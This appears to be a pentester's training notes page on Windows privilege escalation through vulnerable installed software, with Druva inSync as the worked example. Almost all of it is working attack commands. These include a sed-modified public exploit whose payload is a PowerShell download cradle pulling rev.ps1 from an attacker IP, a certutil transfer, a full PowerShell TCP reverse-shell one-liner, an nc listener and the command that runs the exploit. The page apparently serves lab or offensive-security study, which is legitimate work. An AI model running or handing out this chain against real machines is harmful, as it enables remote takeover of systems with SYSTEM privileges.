---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "WINDOWS VULNERABLE SOFTWARE INSTALLED"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Theory*

Operators may be able to escalate privileges on a well-patched system and with the absence of misconfigurations if there is some vulnerable third-party software installed in the system in question

The latter can occur if the employee's user account belongs to the administrators group or any other privileged group or simply has the necessary rights to install any kind of software

Now let's imagine that the given software creates one or several services during its installation setup, and one of those services run as *LOCAL SYSTEM*. If so, we might achieve code execution as the latter if the software has any security flaw or published vulnerability

---

#### *Enumeration*

##### *Listing Installed Software/Programs*

> ***CMD & PS***

```bash
wmic product get name
```

> ***PS***

```bash
Get-WMIObject -Class Win32_Product | Select Name, Version
```

---

#### *Abusing a Service Security Flaw*

##### *Introduction*

Once we list all the installed software in the target, there is an application that stands out from the rest, namely *Druva Sync*

A quick *Google* search shows that the installed version is vulnerable to a command injection attack through an *RPC* exposed service, which is accesible from *127.0.0.1:6064*

##### *Abuse - Windows*

###### *Verifying the listening port*

> ***CMD & PS***

```bash
netstat -ano | findstr /I '6064'
```

> ***PS***

```bash
Get-NetTCPConnection -State Listen -LocalPort 6064
```

###### *Gathering information about the given process*

- ***Extracting the PID of the process listening on the TCP port above***

```bash
(Get-NetTCPConnection -State Listen -LocalPort 6064).OwningProcess
```

- ***Listing information about the process in question***

```bash
Get-Process -Id (Get-NetTCPConnection -State Listen -LocalPort 6064).OwningProcess | Select *
```

- ***Retrieving the Process name***

> ***Get-Process***

```bash
Get-Process -Id (Get-NetTCPConnection -State Listen -LocalPort 6064).OwningProcess | Select -ExpandProperty ProcessName
```

> ***Get-CIMInstance***

```bash
(Get-CIMInstance -ClassName win32_process -Filter 'ProcessId="4"').Name
```

###### *Retrieving information about the service*

> ***CMD & PS***

```bash
sc.exe qc '<SERVICE_NAME>'
```

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Property * | ? { $_.displayName -Match '.*Druva.*' }
```

###### *PoC Setup*

> ***[ExploitDB](https://www.exploit-db.com/exploits/49211)***

- ***Downloading the exploit***

> ***From the attacker*** ⚔️ 

```bash
curl --silent --location --request GET --output - 'https://www.exploit-db.com/raw/49211' | sed "s@net user pwnd /add@powershell.exe -Command IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/rev.ps1')@g" > exploit.ps1
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --location --request GET --output - 'https://www.exploit-db.com/raw/49211' | sed "s@net user pwnd /add@powershell.exe -Command IEX (New-Object Net.WebClient).downloadString('http://10.10.15.63/rev.ps1')@g" > exploit.ps1
> ```
>

- ***Transferring it to the target***

> ***From the attacker*** ⚔️ 

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/exploit.ps1'
```

###### *Reverse Shell Setup*

Since the exploit above runs the command below, we have to setup a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]***, so the target will request this resource and we will receive an incoming shell to the specified *TCP* port

```bash
powershell.exe -Command IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/rev.ps1')
```

Therefore, we can proceed as follows →

- ***Downloading the reverse shell***

> ***[Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --output rev.ps1 'https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1'
```

Then, we have to replace the given *IP Address* and *TCP Port*

> [!BUG]- *rev.ps1*
>
> ```bash
> $client = New-Object System.Net.Sockets.TCPClient('10.10.15.63',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

Lastly, we set up an *HTTP* server to share the resource above

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

###### *Setting up a TCP Listener*

> ***From the attacker*** ⚔️

```bash
rlwrap -CaR nc -nlvp <TCP_PORT>
```

> [!DANGER]- *e.g.*
>
> ```bash
> rlwrap -CaR nc -nlvp 443
> ```
>

###### *Running the exploit*

> ***From the target*** 🎯

```bash
powershell.exe -ExecutionPolicy Bypass -File 'C:\Windows\Temp\LPE\exploit.ps1'
```

##### *Reference*

***[Matteo Malvica: LPE Path Traversal](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/)***